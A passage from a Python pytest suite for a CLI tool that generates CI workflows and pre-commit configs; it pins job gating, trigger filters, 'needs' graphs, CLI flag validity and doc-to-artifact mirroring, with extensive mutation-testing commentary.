# `stage: validate` left 95 passed and put the `environment: production` play
# button in stage 1 — the exact state the stages-order message says it prevents.
# Order and assignment are two halves of one contract; pinning one is pinning
# neither.
_EXPECTED_GL_JOB_STAGES = {
    "validate-config": "validate",
    "lint-custom-rules": "validate",
    "apply": "apply",
}

_EXPECTED_GL_JOB_RULES = {
    "validate-config": [{"changes": ["conf.d/**/*", "rule-packs/**/*"]}],
    # ⛔ `exists:` is a FILE glob, not a directory. The bare
    # `rule-packs/custom/` form is resolved by GitLab with a bsearch over the
    # sorted worktree paths — a binary search against a non-monotonic
    # predicate — so whether it matched depended on the surrounding tree, and
    # a miss ANDs with `changes:` to make the job simply not exist. No error,
    # no red, just a missing governance gate.
    "lint-custom-rules": [
        {"changes": ["rule-packs/custom/**/*"],
         "exists": ["rule-packs/custom/**/*"]}
    ],
}


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_github_workflow_top_level_shape(generated, ci, deploy) -> None:
    """⛔ EXACT sets, top-level AND jobs — the #1347 detector that needs no binary.

    Both assertions below are ``==``, and that is the whole point. A subset
    check (``'jobs' in workflow``) is what the pre-existing test did, and it
    stayed green while ``apply`` was a stray top-level key.

    Measured, not assumed: weakening BOTH equalities to subset relations and
    re-introducing the #1347 bug turns this test green again while actionlint
    still fails — so the equality form, not the parse, is what the offline leg
    buys. The two cover different halves and neither is redundant: the jobs-set
    equality catches a job that went MISSING, the top-level equality catches
    whatever it went missing INTO (and names it in the failure message).
    """
    path = generated[(ci, deploy)] / _GH_WORKFLOW
    workflow = yaml.safe_load(path.read_text(encoding="utf-8"))

    assert set(workflow) == _EXPECTED_GH_TOP_LEVEL, (
        f"unexpected top-level keys in the workflow generated by "
        f"`--ci {ci} --deploy {deploy}`: got {sorted(map(str, workflow))}, "
        f"expected {sorted(map(str, _EXPECTED_GH_TOP_LEVEL))}. An extra key is "
        f"almost always a job block that lost its indentation (#1347); GitHub "
        f"rejects the ENTIRE file when that happens."
    )
    assert set(workflow["jobs"]) == _EXPECTED_GH_JOBS, (
        f"job set drifted for `--ci {ci} --deploy {deploy}`: "
        f"{sorted(workflow['jobs'])}"
    )
    for name, job in workflow["jobs"].items():
        assert isinstance(job, dict) and "steps" in job, (
            f"job {name!r} has no steps — it did not parse as a job body"
        )


# ============================================================
# ── 3b. Job reachability: does every job have an event? (#1356) ──
# ============================================================
#
# GitHub Actions, "Using jobs in a workflow" / `jobs.<job_id>.needs`:
#
#   "If a job fails or is SKIPPED, all jobs that need it are skipped unless
#    the jobs use a conditional expression that causes the job to continue."
#
# So a job's `needs` is not just an ordering constraint — it is a *skip
# channel*. `apply` shipped with `needs: [validate, generate]` + `if:
# github.event_name == 'workflow_dispatch'`, while `generate` carried `if:
# github.event_name == 'pull_request'`. On a workflow_dispatch run `generate`
# is skipped, and `apply` was skipped with it; on a pull_request run `apply`'s
# own `if` is false. Zero reachable events — the deploy stage could never run,
# and nothing was red.
#
# This repo already records the same mechanic from the other direction:
# .github/workflows/ci.yml, the `Python Tests (3.13)` aggregation gate, whose
# `always():` comment says "without it a failed/skipped dependency SKIPS this
# job" (grep that sentence — a line number here goes stale on the next edit of
# a 1700-line workflow, and it already had). `if: always()` is precisely
# the "conditional expression that causes the job to continue" escape hatch
# named in the quote above.
#
# ⛔ The evaluator below is deliberately TINY and deliberately fail-closed.
# It understands one expression shape, and any other shape is an ERROR rather
# than an assumption. Guessing "probably reachable" is the unsafe direction:
# the test would go green while the job never runs — which is the exact defect
# class this section exists to catch.

_EVENT_EQ_RE = re.compile(
    r"""^\s*(?:\$\{\{)?\s*github\.event_name\s*==\s*'([A-Za-z0-9_]+)'\s*(?:\}\})?\s*$"""
)


class _UnsupportedIf(AssertionError):
    """Raised for an `if:` this evaluator has not been taught to read."""


def _workflow_events(workflow: dict, label: str) -> tuple[str, ...]:
    """The event names in the workflow's `on:` block — derived, never hard-coded.

    ⚠️ PyYAML is a YAML 1.1 parser, so the bare key ``on:`` arrives as the
    Python boolean ``True`` (see the note above ``_EXPECTED_GH_TOP_LEVEL``).
    Accept either spelling rather than assuming one.
    """
    trigger = workflow.get(True, workflow.get("on"))
    if isinstance(trigger, dict):
        events = tuple(str(k) for k in trigger)
    elif isinstance(trigger, list):
        events = tuple(str(k) for k in trigger)
    elif isinstance(trigger, str):
        events = (trigger,)
    else:
        raise AssertionError(
            f"{label}: cannot read the `on:` block (got {trigger!r}). Without "
            f"an event set this whole reachability check would be vacuous."
        )
    assert events, f"{label}: the workflow declares no triggering events"
    return events


def _if_holds(expr, event: str, label: str) -> bool:
    """Evaluate a job-level ``if:`` for one event name.

    Supported: absent/empty (always true), and ``github.event_name == '<x>'``
    with or without a ``${{ }}`` wrapper. That is the only shape either
    generator emits today.

    ⛔ Anything else raises. Do NOT add a "treat unknown as true" fallback —
    an unrecognised condition that is really false would make an unreachable
    job look reachable, i.e. this file green and the customer's deploy stage
    dead. Teaching the evaluator a new shape is the correct response.
    """
    if expr is None:
        return True
    if not isinstance(expr, str) or not expr.strip():
        raise _UnsupportedIf(
            f"{label}: non-string `if:` {expr!r} — the reachability evaluator "
            f"needs extending before this workflow can be judged."
        )
    m = _EVENT_EQ_RE.match(expr)
    if not m:
        raise _UnsupportedIf(
            f"{label}: `if: {expr}` is a shape the reachability evaluator does "
            f"not understand. It only reads `github.event_name == '<event>'`. "
            f"⛔ Extend the evaluator (and its counter-example test) — do not "
            f"relax it to assume the job runs, which is how #1356 would hide."
        )
    return m.group(1) == event


def _needs_of(job: dict) -> tuple[str, ...]:
    needs = job.get("needs")
    if needs is None:
        return ()
    if isinstance(needs, str):
        return (needs,)
    return tuple(str(n) for n in needs)


def _runs_under(name: str, event: str, jobs: dict, label: str,
                stack: tuple[str, ...] = ()) -> bool:
    """Would job ``name`` execute on a run triggered by ``event``?

    True iff its own ``if:`` holds AND every job in its transitive ``needs``
    closure also runs — because a skipped dependency skips its dependants.
    """
    assert name not in stack, (
        f"{label}: `needs` cycle {' -> '.join(stack + (name,))}"
    )
    job = jobs.get(name)
    assert isinstance(job, dict), (
        f"{label}: job {name!r} is referenced by `needs` but is not a job in "
        f"this workflow"
    )
    if not _if_holds(job.get("if"), event, f"{label}/{name}"):
        return False
    return all(
        _runs_under(dep, event, jobs, label, stack + (name,))
        for dep in _needs_of(job)
    )


# ⛔ The CONTRACT, both directions. An earlier draft asserted only that no job
# was dead — which measures exactly one half of "is this job gated correctly".
# Adversarial review deleted all three `apply` gates (making `kubectl apply -f`
# / `helm upgrade --install` / `argocd app sync --prune`, every one of them
# under `environment: production`, run on EVERY pull_request and every push to
# main) and the whole suite stayed green at 222 passed — because a WIDER
# reachable set contains no dead job. The blast radius of that direction is far
# larger than #1356's, so the map is pinned exactly rather than floor-checked.
# ⛔ The GitHub trigger's FILTERS, pinned like the GitLab `rules:` are. Event
# names alone were the only thing checked, and a filter is where the damage is
# quiet: measured, rewriting the generated `on:` to
# `pull_request: {paths: ['this-path-does-not-exist/**']}` plus
# `push: {branches: [no-such-branch]}` left 95 passed and zero red, while
# `validate` and `generate` stopped firing on every PR and push — and `apply`
# (environment: production) stayed a live manual deploy. Exactly the asymmetry
# this file names as its most productive defect shape, left on the leg that
# produced #1347.
# The two legs legitimately differ (the preview is a simplified sample), so this
# is passed per-leg rather than shared — but BOTH are pinned, which is the point.
_CLI_GH_TRIGGERS = {
    "pull_request": {"paths": ["conf.d/**", "kustomize/**", "rule-packs/**"]},
    # ⛔ NO `branches:` key. `on.push.branches` takes literals only, so any
    # value there is a guess at the customer's default branch — `main` is
    # simply wrong for a `master`/`trunk` repo, and that leg then never
    # fires. Pinning the ABSENCE is the contract: it says "we deliberately
    # do not guess", where pinning `["main"]` would have cemented the bug
    # and made the eventual fix red a test.
    #
    # ⛔ The SAME three trees as `pull_request`. This used to be `conf.d/**`
    # alone, so a direct push touching only `rule-packs/custom/**` ran
    # nothing — and the custom-rule governance lint inside `validate` is
    # scoped to exactly that tree. Held equal by
    # `test_the_push_leg_watches_the_same_trees_as_the_pr_leg` below, so the
    # two cannot drift apart again by editing one of them.
    "push": {"paths": ["conf.d/**", "kustomize/**", "rule-packs/**"]},
    "workflow_dispatch": None,
}
# Pinned WITH versions: a name-only pin accepted `actions/checkout@v1`.
# The argocd apply stage deliberately has no checkout (`argocd app sync`
# talks to the server), so the count is deploy-dependent — derived here
# rather than listed per combination.
def _cli_gh_uses(deploy: str) -> list[str]:
    checkouts = 2 if deploy == "argocd" else 3
    return sorted(["actions/checkout@v4"] * checkouts
                  + ["marocchino/sticky-pull-request-comment@v2"])


_PORTAL_GH_USES = ["actions/checkout@v4"] * 3

_PORTAL_GH_TRIGGERS = {
    "pull_request": {"paths": ["conf.d/**"]},
    "push": {"paths": ["conf.d/**"]},
    "workflow_dispatch": None,
}

_GH_JOB_EVENTS = {
    "validate": {"pull_request", "push", "workflow_dispatch"},
    "generate": {"pull_request"},
    "apply": {"workflow_dispatch"},
}

# ⛔ The `needs` EDGES, pinned separately — and that separation is the point.
# The event map above cannot see them: deleting `apply`'s `needs: [validate]`
# altogether leaves every job's reachable-event set unchanged, so the whole
# suite stayed green under it (measured: 58 passed, identical to baseline)
# while `apply` — which carries `environment: production` and runs
# `kubectl apply -f` / `helm upgrade --install` / `argocd app sync --prune` —
# lost its only "the config must pass validate first" gate. Third face of the
# same family: #1356 was a `needs` edge that was too WIDE, the `if:` map above
# covers gates that are too wide, and this covers a `needs` edge that is too
# NARROW. All three let more reach production; none of the others sees this one.
_GH_JOB_NEEDS = {
    "validate": (),
    "generate": ("validate",),
    "apply": ("validate",),
}


def _assert_job_event_reachability(workflow: dict, label: str,
                                   expected: dict[str, set[str]],
                                   expected_needs: dict[str, tuple] | None = None) -> None:
    events = _workflow_events(workflow, label)
    jobs = workflow.get("jobs")
    assert isinstance(jobs, dict) and jobs, f"{label}: no `jobs:` mapping"

    if expected_needs is not None:
        got_needs = {n: _needs_of(j) for n, j in jobs.items()}
        assert got_needs == expected_needs, (
            f"{label}: the `needs:` graph changed.\n"
            f"  got : {got_needs}\n  want: {expected_needs}\n"
            "⛔ This is checked separately from the event map because the event "
            "map cannot see it: dropping an edge leaves every job's reachable "
            "events unchanged. `apply` runs under `environment: production`, so "
            "losing `needs: [validate]` means an unvalidated config deploys. If "
            "the graph change is deliberate, update _GH_JOB_NEEDS in the same "
            "commit so the new shape is reviewable."
        )

    reachability = {
        name: {e for e in events if _runs_under(name, e, jobs, label)}
        for name in jobs
    }
    pretty = {n: sorted(r) for n, r in sorted(reachability.items())}

    # Reported first: it is the more diagnostic failure, and the one #1356 was.
    dead = sorted(n for n, r in reachability.items() if not r)
    assert not dead, (
        f"{label}: {dead} can NEVER run — no event in {sorted(events)} "
        f"satisfies both the job's own `if:` and its transitive `needs` "
        f"closure. GitHub skips every job that needs a SKIPPED job, so a "
        f"`needs:` on an event-gated sibling silently disables the dependant "
        f"(#1356). Full map: {pretty}"
    )
    got = {n: sorted(r) for n, r in reachability.items()}
    want = {n: sorted(r) for n, r in expected.items()}
    assert got == want, (
        f"{label}: the set of events each job runs on changed.\n"
        f"  got : {got}\n  want: {want}\n"
        "⛔ A job that runs on MORE events than intended is not caught by the "
        "dead-job check above — `apply` carries `environment: production` and "
        "writes to the customer's cluster, so widening it to pull_request or "
        "push means every PR deploys. If this change is deliberate, update "
        "_GH_JOB_EVENTS in the same commit so the new contract is reviewable."
    )


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_generated_workflow_job_event_gating(generated, ci, deploy) -> None:
    """⛔ The #1356 detector. Needs no binary — actionlint does not check this.

    actionlint validates that a `needs:` target EXISTS and that no cycle is
    formed; it has no opinion about whether the resulting graph can ever fire.
    """
    path = generated[(ci, deploy)] / _GH_WORKFLOW
    _assert_job_event_reachability(
        yaml.safe_load(path.read_text(encoding="utf-8")),
        f"`da-tools init --ci {ci} --deploy {deploy}` workflow",
        _GH_JOB_EVENTS,
        _GH_JOB_NEEDS,
    )


def _synthetic(if_expr, needs=None, events=("pull_request", "workflow_dispatch")):
    """A two-job workflow: `gate` is pull_request-only, `subject` is under test."""
    subject: dict = {"runs-on": "ubuntu-latest", "steps": []}
    if if_expr is not None:
        subject["if"] = if_expr
    if needs is not None:
        subject["needs"] = needs
    return {
        True: {e: None for e in events},
        "jobs": {
            "gate": {"if": "github.event_name == 'pull_request'",
                     "runs-on": "ubuntu-latest", "steps": []},
            "subject": subject,
        },
    }


# ⛔ The evaluator's ONLY safety property is that it refuses to score an `if:`
# it does not understand. Nothing pinned that: adversarial review replaced both
# `raise _UnsupportedIf` with `return True` — the exact relaxation the code
# comment forbids in prose — and the suite stayed green at 52 passed, because
# the two shipped generators happen to emit only the one supported shape. A
# prose ⛔ stops no machine, so the property gets a counter-example test.
_UNSUPPORTED_IFS = [
    "always()",
    "!cancelled()",
    "success() && github.event_name == 'workflow_dispatch'",
    "github.event_name == 'push' || github.event_name == 'pull_request'",
    "github.event_name != 'push'",
    "${{ github.actor != 'nobody' }}",
    "github.ref == 'refs/heads/main'",
    "true",
]


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_generated_commands_pass_only_flags_the_cli_declares(
    generated, ci, deploy
) -> None:
    """⛔ Every `da-tools <sub> --flag` in a shipped artifact must be a real flag.

    The two validators grade YAML; an unrecognised flag is a runtime error, so
    nothing in this file could see it — and the shipped `validate-config
    --config-dir … --ci` was exactly that: `--ci` belongs to
    `lint_custom_rules.py`, not to `validate_config.py`, so Stage 1 exited 2 on
    every run and `needs: [validate]` propagated the skip to `generate` and
    `apply`. The customer's first PR after `da-tools init` could never go green.

    Both the subcommand set and each one's flags are read from source, so a new
    subcommand or a renamed flag is covered the day it lands.
    """
    declared = _da_tools_subcommands()
    checked = 0
    for path in sorted((generated[(ci, deploy)]).rglob("*")):
        if path.is_dir() or path.suffix not in {".yaml", ".yml"}:
            continue
        doc = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
        blocks: list[str] = []
        for value in _walk_scalars(doc):
            blocks.append(_strip_shell_comments(value))
        for argv in [a for b in blocks for a in _command_argvs(b)]:
            for i, tok in enumerate(argv):
                if tok not in declared:
                    continue
                used = {
                    t.split("=")[0] for t in argv[i + 1:]
                    if t.startswith("--")
                }
                unknown = sorted(used - declared[tok] - _CLI_GLOBAL_FLAGS)
                assert not unknown, (
                    f"{path.name} runs `da-tools {tok}` with flag(s) {unknown}, "
                    f"which that subcommand does not declare "
                    f"(it has {sorted(declared[tok]) or 'none'}).\n"
                    "argparse exits 2 on an unrecognised flag, so the step fails "
                    "on every run and every job that `needs:` it is skipped — a "
                    "pipeline that can never go green. Neither actionlint nor "
                    "the GitLab schema can see this; only this assertion can."
                )
                if len(argv) > 1:
                    checked += 1
    # ⛔ Counts only MULTI-TOKEN argv. `validate` is itself a subcommand name,
    # so `stage: validate`, `needs: validate` and `stages: [validate, …]` each
    # incremented this floor — measured: with real-command extraction disabled,
    # the three `--ci github` combinations stayed green on bare names alone.
    assert checked, (
        f"no multi-token `da-tools <subcommand> …` invocation found in the "
        f"--ci {ci} --deploy "
        f"{deploy} artifacts — the extractor stopped matching, so this test "
        "would pass vacuously."
    )


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_generated_precommit_hooks_can_actually_run(generated, ci, deploy) -> None:
    """⛔ The pre-commit artifact's `entry:` must be executable, not just valid YAML.

    pre-commit splits `entry` with shlex and execs it WITHOUT a shell
    (`pre_commit/lang_base.py`), so any `$VAR` / `${VAR}` / `$(cmd)` in there is
    passed through literally. The shipped hooks used
    `docker run -v ${PWD}/conf.d:...` under `language: system`, which handed
    docker the literal string `${PWD}/conf.d` and failed on EVERY commit that
    touched conf.d — the "shift-left" artifact protected nothing, with a cryptic
    invalid-volume error as its only symptom.

    The pre-existing tests asserted the snippet parses, declares a local repo,
    names both hook ids, filters on conf.d and sets a language. Every one of
    those passed on a hook that could not run: "is it well-formed" and "does it
    work" are different questions, and only the first was being asked.
    """
    root = generated[(ci, deploy)]
    path = root / ".pre-commit-config.da.yaml"
    cfg = yaml.safe_load(path.read_text(encoding="utf-8"))
    hooks = [h for r in cfg["repos"] for h in r["hooks"]]
    assert hooks, "no hooks in the generated pre-commit config"

    holders = {
        p.rsplit("/", 1)[0]
        for p in _files_written(root)
        if p.endswith("_defaults.yaml")
    }
    assert len(holders) == 1, f"expected one config directory, got {holders}"
    config_dir = holders.pop()
    for hook in hooks:
        entry = str(hook.get("entry", ""))
        assert not re.search(r"\$\{?\w+|\$\(", entry), (
            f"hook {hook.get('id')!r} entry contains a shell expansion: "
            f"{entry!r}. pre-commit execs `entry` without a shell, so this "
            "reaches the process as a literal and the hook fails on every run."
        )
        # `language: system` means "run this argv as-is"; a `docker run` there
        # needs an absolute mount source, which cannot be produced without a
        # shell. docker_image is the language that supplies the mount itself.
        if entry.split()[:2] == ["docker", "run"]:
            assert hook.get("language") == "docker_image", (
                f"hook {hook.get('id')!r} hand-rolls `docker run` under "
                f"`language: {hook.get('language')!r}`. Use docker_image and let "
                "pre-commit build the command and the /src mount."
            )

        # ⛔ The two assertions above only rule out shapes that cannot LAUNCH.
        # An earlier version of this test stopped there and called itself "can
        # actually run", which was a name claiming more than the body did: two
        # edits that leave the hook launchable and failing on every commit both
        # measured 318 passed. Everything below derives the argv pre-commit will
        # really exec and holds it to the same CLI contract the workflow
        # artifacts are held to.
        argv = shlex.split(entry)
        sub = next(
            (a for a in argv[1:] if not a.startswith("-")), None,
        ) if hook.get("language") == "docker_image" else None
        if sub is None:
            continue

        # (a) `language: docker_image` mounts the working tree at /src and sets
        # `--workdir /src` (pre_commit/languages/docker.py). /src is therefore
        # the ONLY path inside that container that has anything to do with the
        # user's repo, so an absolute path anywhere else in the argv cannot
        # resolve. Measured: `--config-dir /data/conf.d` (the mount point the
        # hand-rolled `docker run` version used) left 318 passed, and exits 2
        # with "config-dir not found" on a real commit.
        for token in argv:
            if token.startswith("/"):
                assert token == _PRECOMMIT_MOUNT or token.startswith(
                    _PRECOMMIT_MOUNT + "/"), (
                    f"hook {hook.get('id')!r} passes the absolute path "
                    f"{token!r}, which is outside {_PRECOMMIT_MOUNT!r}. "
                    "`language: docker_image` mounts the repo there and "
                    "nowhere else, so this path does not exist in the "
                    "container."
                )

        # (c) ⛔ The hook's `files:` decides whether it runs AT ALL, and this PR
        # pinned that property on both CI legs (`_CLI_GH_TRIGGERS`,
        # `_EXPECTED_GL_JOB_RULES`) with the argument that a filter matching
        # nothing "leaves validate and generate dead on every PR". The third
        # generated artifact has the identical property and got a substring
        # check instead: measured, rewriting `^conf\.d/` to `^NOPEconf\.d/`
        # left 341 passed because the old assertion only asked whether the
        # pattern contained "conf". Derived from what `run_init` actually wrote,
        # so renaming the config directory moves both together.
        expected_files = rf"^{re.escape(config_dir)}/.*\.ya?ml$"
        assert str(hook.get("files", "")) == expected_files, (
            f"hook {hook.get('id')!r} filters on {hook.get('files')!r}, but "
            f"`da-tools init` writes tenant config into {config_dir!r} "
            f"(expected {expected_files!r}). A filter that matches nothing is a "
            "shift-left hook that never fires, on every commit, silently."
        )

        # (b) pre-commit appends the matched filenames to argv unless
        # `pass_filenames: false` — and ⛔ its DEFAULT is true, so omitting the
        # key is the dangerous spelling, not the safe one. Whether that is
        # survivable is not a matter of taste: it depends on whether the target
        # subcommand declares a positional, which argparse knows and we derive.
        # Measured: flipping it to true left 318 passed, and exits 2 with
        # "unrecognized arguments: <path>" on a real commit.
        positionals = _da_tools_positionals()
        assert sub in positionals, (
            f"hook {hook.get('id')!r} invokes {sub!r}, which is not a da-tools "
            "subcommand — check the entrypoint dispatch table."
        )
        if hook.get("pass_filenames", True):
            assert positionals[sub], (
                f"hook {hook.get('id')!r} lets pre-commit append filenames "
                f"(pass_filenames defaults to true), but `{sub}` declares no "
                f"positional argument, so argparse rejects them: "
                f"`unrecognized arguments: <file>`. Either set "
                "`pass_filenames: false` or invoke a subcommand that takes "
                "paths."
            )


# The customer-facing pages that carry a mirrored artifact block. HARD-CODED as
# a pair rather than globbed: an anti-vacuity floor must not be derived from the
# thing it protects, and a glob that quietly stopped matching would leave this
# guard testing nothing while staying green.
#
# ⛔ Written as literal path strings for the same reason `_INIT_PROJECT` is (see
# its comment above): verify_diff.py builds its source→test map by scanning test
# files for literal paths, so a `/ "docs" / "scenarios"` split form would
# register this guard against NOTHING and editing the page would not select it.
_MIRROR_DOC_PAGES = (
    "docs/scenarios/gitops-ci-integration.md",
    "docs/scenarios/gitops-ci-integration.en.md",
)

# A page declares "the fenced block below mirrors that artifact" with this
# marker, and the guard learns WHICH artifact from the page itself.
#
# ⛔ Two earlier designs failed here, in opposite directions, and the current
# one has to keep both lessons:
#
#   1. "the ONE fenced ```yaml block whose top level is `repos:`" inferred the
#      target from contents. Three legitimate Markdown edits went red with a
#      message that named none of them: an info string (```yaml title="…" —
#      `pymdownx.highlight` and `superfences` are enabled), an indented fence
#      (`pymdownx.tabbed`), and adding a second, honest example.
#   2. Replacing that with "compare the blocks that carry a marker" fixed the
#      false reds and DELETED the coverage. Measured: pasting the pre-#1418
#      broken snippet back onto the page as an unmarked second example left
#      this file green and all four doc lints at rc=0 — the exact defect
#      #1418 exists for, reintroducible in full.
#
# So the marker says which artifact, and the exhaustiveness test below
# says every pre-commit block must carry one. Neither half is optional.
_MIRROR_MARKER = re.compile(r"<!--\s*mirrors-artifact:\s*(?P<path>\S+?)\s*-->")

# The artifact whose mirror carries a `da-tools` argv. Other artifacts may be
# mirrored with the same marker (a `_defaults.yaml` sample, say) and must not
# be dragged through assertions about hook entries.
_PRECOMMIT_ARTIFACT = ".pre-commit-config.da.yaml"


def _fence_after(text: str, pos: int) -> tuple[int, str] | None:
    """The first fenced block at or after ``pos`` as ``(start_offset, body)``.

    The language tag is deliberately NOT part of the contract: the marker above
    a block is what declares what it is, so ```yaml, ```yml and a bare ``` all
    work, with or without an info string, at any indentation. Returns None when
    there is no complete fence — callers turn that into a failure, because a
    silently empty block would make a comparison vacuously true.
    """
    lines = text[pos:].splitlines(keepends=True)
    opener = indent = None
    consumed = 0
    for i, line in enumerate(lines):
        stripped = line.lstrip()
        if stripped.startswith("```"):
            opener, indent = i, len(line) - len(line.lstrip())
            break
        consumed += len(line)
    if opener is None:
        return None
    start = pos + consumed
    body: list[str] = []
    for line in lines[opener + 1:]:
        if line.lstrip().startswith("```"):
            return start, "".join(body)
        body.append(line[indent:] if not line[:indent].strip() else line.lstrip())
    return None


def _precommit_fences(text: str) -> list[int]:
    """Start offsets of every fenced block that IS a pre-commit config.

    Identified by content (top level is a `repos:` mapping), which is what
    makes the exhaustiveness check below independent of the marker: a block
    someone forgets — or declines — to mark is still found.
    """
    found: list[int] = []
    pos = 0
    while True:
        hit = _fence_after(text, pos)
        if hit is None:
            return found
        start, body = hit
        try:
            loaded = yaml.safe_load(body)
        except yaml.YAMLError:
            loaded = None
        if isinstance(loaded, dict) and "repos" in loaded:
            found.append(start)
        pos = start + len(body) + 1


def _marked_fences(text: str) -> dict[int, str]:
    """Start offset -> declared artifact path, for every marked block."""
    out: dict[int, str] = {}
    for marker in _MIRROR_MARKER.finditer(text):
        hit = _fence_after(text, marker.end())
        if hit is not None:
            out[hit[0]] = marker.group("path")
    return out


def _unmarked_precommit_blocks(text: str) -> list[int]:
    """Offsets of pre-commit blocks on the page that carry no mirror marker.

    A pure function, for the same reason `_undeclared_da_tools_usage` is one:
    the real pages have zero unmarked blocks — that is the fixed state — so
    asserting against them cannot tell this apart from `return []`. Measured:
    replacing the caller's subtraction with an empty set left the section at 28
    passed. The synthetic case below is the only input that distinguishes them.
    """
    return sorted(set(_precommit_fences(text)) - set(_marked_fences(text)))


def _markdown_code_spans(text: str) -> list[str]:
    """Every fenced block and inline code span on the page — prose excluded.

    ⛔ Scoping by Markdown STRUCTURE, not by a list of words to ignore. The
    first version of the caller scanned the raw page and immediately reported
    `da-tools commands` from the sentence "All da-tools commands" in a link
    description. That false positive is the whole reason
    `check_doc_datools_cmds.py` documents a repo-wide version as prototyped and
    rejected: prose mentions a command name without inviting anyone to run it,
    and no denylist of English words converges. A code span, by contrast, is
    exactly the thing a reader copies.
    """
    fences: list[str] = []
    prose = re.sub(
        r"^[ \t]*```[^\n]*\n(.*?)^[ \t]*```",
        lambda m: fences.append(m.group(1)) or "\n",
        text,
        flags=re.S | re.M,
    )
    return fences + re.findall(r"`([^`\n]+)`", prose)


def _da_tools_invocations(text: str) -> list[tuple[str, tuple[str, ...]]]:
    """``(subcommand, flags)`` for every `da-tools` call inside a code span."""
    out: list[tuple[str, tuple[str, ...]]] = []
    for span in _markdown_code_spans(text):
        # Fold shell line-continuations: the page splits `da-tools init … \`
        # over seven lines, and a per-line scan sees the subcommand but none of
        # its flags — which is the half that was wrong for two releases.
        folded = re.sub(r"\\\s*\n\s*", " ", span)
        for match in re.finditer(r"(?<![\w./-])da-tools\s+([a-z][a-z0-9-]*)", folded):
            tail = re.split(r"\n", folded[match.end():], maxsplit=1)[0]
            flags = tuple(re.findall(r"(?<![\w-])(--[a-z][a-z0-9-]*)", tail))
            out.append((match.group(1), flags))
    return out


def _undeclared_da_tools_usage(
    text: str, declared: dict[str, set[str]]
) -> list[str]:
    """Every `da-tools <sub> <flag>` on the page that argparse would reject.

    A pure function on purpose: the real pages are all-clean, so asserting on
    them alone cannot tell this apart from a stub. The negative-control test
    below feeds it a page that IS wrong, which is the only input that
    distinguishes the two.
    """
    problems: list[str] = []
    for sub, flags in _da_tools_invocations(text):
        if sub not in declared:
            problems.append(f"da-tools {sub} (no such subcommand)")
            continue
        problems.extend(
            f"da-tools {sub} {flag}" for flag in flags
            # ⛔ `_CLI_GLOBAL_FLAGS` subtracted here as it is at the module's
            # two other call sites. Without it, documenting
            # `da-tools validate-config --help` was reported as a flag "the CLI
            # would reject" — measured rc=0, so the message asserted something
            # false, on a page a customer reads.
            if flag not in declared[sub] and flag not in _CLI_GLOBAL_FLAGS
        )
    return problems


def _normalised_precommit(cfg: object) -> object:
    """The whole config, with folded-scalar whitespace collapsed and NOTHING dropped.

    ⛔ The first version projected six hook keys it had decided to care about.
    That is an enumeration wearing an allowlist's clothes, and it was measurably
    blind: `repo:` was dropped entirely — `repo: meta` is a config
    `pre-commit validate-config` refuses outright — and every key nobody had
    thought of (`stages:`, `args:`, `exclude:`, `always_run:`) was invisible by
    construction. A blind review flipped the page to `repo: meta` plus
    `stages: [manual]` and the guard stayed green.

    ⛔ And because this filter is applied to BOTH sides of the comparison it
    feeds, any weakening of it keeps that equation true: replacing this body
    with `return "MUTANT-CONSTANT"` left the whole file green. That is what
    `test_normalised_precommit_keeps_what_the_comparison_needs` is for — it is
    the only thing standing between this function and a no-op.

    The single normalisation is that `entry` arrives from a folded (``>-``)
    scalar on both sides, where line-wrapping is each side's formatting choice
    and only the token sequence is contractual.
    """
    if isinstance(cfg, dict):
        return {
            key: (" ".join(str(value).split()) if key == "entry"
                  else _normalised_precommit(value))
            for key, value in cfg.items()
        }
    if isinstance(cfg, list):
        return [_normalised_precommit(item) for item in cfg]
    return cfg


# --------------------------------------------------------------------------
# Negative controls for the helpers above.
#
# ⛔ A blind review weakened ten helpers added with this guard, one at a time,
# and 28 of 41 single-point mutations survived. The cause was structural, not
# careless: every helper was only ever fed inputs that were supposed to PASS —
# two real doc pages and four real config files — so nothing could tell a
# working helper from a stub. These cases feed synthetic inputs that must be
# REJECTED, plus the neighbouring ones that must still be TOLERATED, because
# only pinning the first half lets a helper drift towards biting everything.
# --------------------------------------------------------------------------

_FENCE = "```"

_SYNTHETIC_PAGE = (
    "# Title\n\nSome prose that mentions da-tools commands in passing.\n\n"
    "<!-- mirrors-artifact: some/artifact.yaml -->\n\n"
    f"{_FENCE}yaml title=\"x.yaml\"\nrepos:\n  - repo: local\n"
    "    hooks:\n      - id: h\n        entry: >-\n          img\n"
    f"          run --flag\n{_FENCE}\n\n"
    "Inline `da-tools validate-config --config-dir conf.d/` in a table cell.\n\n"
    f"=== \"tab\"\n\n    {_FENCE}\n    repos:\n      - repo: local\n"
    f"        hooks: []\n    {_FENCE}\n"
)


def test_fence_after_reads_the_forms_mkdocs_allows() -> None:
    """Info strings, bare fences and indented fences are all legal here."""
    marker = _MIRROR_MARKER.search(_SYNTHETIC_PAGE)
    assert marker, "the synthetic page lost its marker"
    hit = _fence_after(_SYNTHETIC_PAGE, marker.end())
    assert hit is not None, "an info-string fence was not found at all"
    body = yaml.safe_load(hit[1])
    assert body["repos"][0]["hooks"][0]["id"] == "h", (
        "the block was found but decoded wrong — most likely the de-indent "
        "branch or the info-string tolerance regressed."
    )
    # `pos` must be honoured: searching past the block finds the NEXT one.
    later = _fence_after(_SYNTHETIC_PAGE, hit[0] + len(hit[1]))
    assert later is not None and later[0] > hit[0], (
        "_fence_after ignored its `pos` argument, so every caller silently "
        "re-reads the first block on the page."
    )
    assert _fence_after("no fences here", 0) is None


def test_precommit_fences_finds_the_indented_one_too() -> None:
    """⛔ The exhaustiveness check is only as wide as this finder.

    Both blocks in the synthetic page are pre-commit configs and one of them is
    indented inside a tab container. A finder that reads only column-zero
    fences would let an indented block go unmarked and unchecked — which is the
    coverage the marker redesign had already lost once.
    """
    assert len(_precommit_fences(_SYNTHETIC_PAGE)) == 2
    # A fenced block that is not a pre-commit config must not be collected.
    assert _precommit_fences(f"{_FENCE}yaml\nfoo: 1\n{_FENCE}\n") == []


def test_unmarked_precommit_blocks_reports_the_block_nobody_marked() -> None:
    """⛔ The control for the exhaustiveness rule.

    The real pages have no unmarked block, so every assertion against them
    passes for `return []` too — measured, by neutering the caller's set
    subtraction and watching the section stay green. Here the input IS
    wrong, which is the only way to tell a working check from a stub.
    """
    marked_only = (
        "<!-- mirrors-artifact: a.yaml -->\n\n"
